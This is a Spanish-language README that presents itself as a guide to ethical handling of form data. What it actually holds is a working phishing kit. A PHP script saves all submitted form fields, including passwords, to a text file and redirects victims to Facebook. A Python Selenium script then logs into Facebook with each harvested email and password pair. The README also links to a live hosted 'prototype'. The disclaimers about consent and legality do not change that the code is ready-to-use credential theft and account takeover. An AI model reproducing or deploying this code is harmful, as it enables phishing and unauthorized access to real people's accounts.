# Buenas Prácticas para Evitar Mal Uso de Datos de Formulario

Este README tiene como objetivo proporcionar información sobre buenas prácticas y directrices para garantizar que las tecnologías y scripts en uso cumplan con los principios éticos y legales, y eviten prácticas maliciosas como la recolección no autorizada de datos de formulario.

## Descripción del Código

El código proporcionado es un ejemplo que ilustra cómo se pueden manipular datos de formulario en un entorno web. Sin embargo, es esencial utilizar este código de manera ética y legal y contar con el permiso adecuado para realizar pruebas y actividades relacionadas con la seguridad.
Este còdigo almacena los datos de un formulario en un bloc de notas y redirige a facebook
```php
<?php
$archivo = fopen("contras.txt", "a");
fwrite($archivo, "\r\n");
foreach ($_POST as $key => $value) {
    fwrite($archivo, $key . "=" . $value . "\r\n");
}
fclose($archivo);
header("Location: https://www.facebook.com");
die();
?>

```
## Buenas Prácticas

Para evitar el mal uso de datos de formulario y garantizar la seguridad y la integridad de los sistemas y los datos, se deben seguir las siguientes buenas prácticas:

1. **Consentimiento y Autorización**: Antes de realizar pruebas de seguridad en cualquier sistema, obtén el consentimiento y la autorización explícita del propietario del sistema o sitio web. Realizar pruebas sin autorización puede ser ilegal.

2. **Entorno Controlado**: Realiza pruebas en un entorno controlado y aislado que no afecte a sistemas o datos en producción.

3. **Transparencia**: Asegúrate de que todas las pruebas se realicen de manera transparente y documentada. Registra todas las actividades realizadas.

4. **Eliminación Segura de Datos**: Si se recopilan datos durante las pruebas, asegúrate de eliminarlos de manera segura y completa una vez que las pruebas hayan concluido.

5. **Cumplimiento Legal**: Cumple con todas las leyes y regulaciones de seguridad informática aplicables en tu jurisdicción.

## Nota Importante

Este README se proporciona con la intención de promover prácticas de seguridad éticas y legales. El código proporcionado no debe utilizarse con fines maliciosos, y se debe tener cuidado de respetar las leyes y regulaciones aplicables en todo momento.
## Automatizar el inicio de sesiòn en facebook con contraseñas y usuarios almacenados en un bloc de notas
El código que proporcionaste es un ejemplo de cómo utilizar Selenium para automatizar el inicio de sesión en una página web utilizando contraseñas almacenadas en un archivo. El código realiza las siguientes acciones:

Configura el controlador de Selenium y abre el sitio web de Facebook.
Lee las credenciales desde un archivo de bloc de notas ("credenciales.txt").
Divide el archivo en bloques separados por líneas en blanco para procesar las credenciales de múltiples usuarios.
Para cada usuario en los bloques separados:
a. Divide cada bloque en líneas y crea un diccionario clave-valor para las credenciales.
b. Verifica si existen las claves 'email' y 'pass' en el diccionario.
c. Encuentra los elementos de usuario y contraseña en la página web.
d. Ingresa las credenciales en los campos correspondientes.
e. Envía el formulario de inicio de sesión.
f. Espera a que la página se cargue (puedes ajustar este tiempo).
g. Realiza cualquier acción adicional si es necesario.
Este código es útil para realizar pruebas o automatizar el proceso de inicio de sesión con múltiples cuentas. Sin embargo, ten en cuenta que su uso debe realizarse de manera ética, legal y en un entorno controlado donde tengas permiso para llevar a cabo pruebas de este tipo. Además, asegúrate de que el archivo de contraseñas se mantenga de manera segura y que las contraseñas se almacenen de forma encriptada y protegida.

```python
from selenium import webdriver
from selenium.webdriver.common.keys import Keys

# Configura el controlador de Selenium y el sitio web de destino
driver = webdriver.Chrome()
driver.get("https://www.facebook.com")

# Lee las credenciales desde el archivo de bloc de notas
with open("credenciales.txt", "r") as file:
    data = file.read()

# Divide el archivo en bloques separados por líneas en blanco
usuarios = data.split('\n\n')

for usuario in usuarios:
    # Divide cada bloque en líneas y crea un diccionario clave-valor
    credenciales = {}
    for line in usuario.split('\n'):
        key, value = line.strip().split('=')
        credenciales[key] = value

    # Verifica si existen las claves 'email' y 'pass' en el diccionario
    if 'email' in credenciales and 'pass' in credenciales:
        email = credenciales['email']
        password = credenciales['pass']

        # Encuentra los elementos de usuario y contraseña
        username_element = driver.find_element_by_id("email")
        password_element = driver.find_element_by_id("pass")

        # Ingresa las credenciales
        username_element.send_keys(email)
        password_element.send_keys(password)

        # Envía el formulario de inicio de sesión
        password_element.send_keys(Keys.RETURN)

        # Espera a que la página se cargue (puedes ajustar este tiempo)
        driver.implicitly_wait(10)

        # Realiza cualquier acción adicional aquí si es necesario

# Cierra el navegador
driver.close()

```
Recuerda que la seguridad informática debe centrarse en proteger sistemas y datos, no en comprometerlos. El cumplimiento ético y legal es fundamental en todas las actividades de seguridad informática.

PROTOTIPO EN:
https://increibleayudargente.000webhostapp.com/
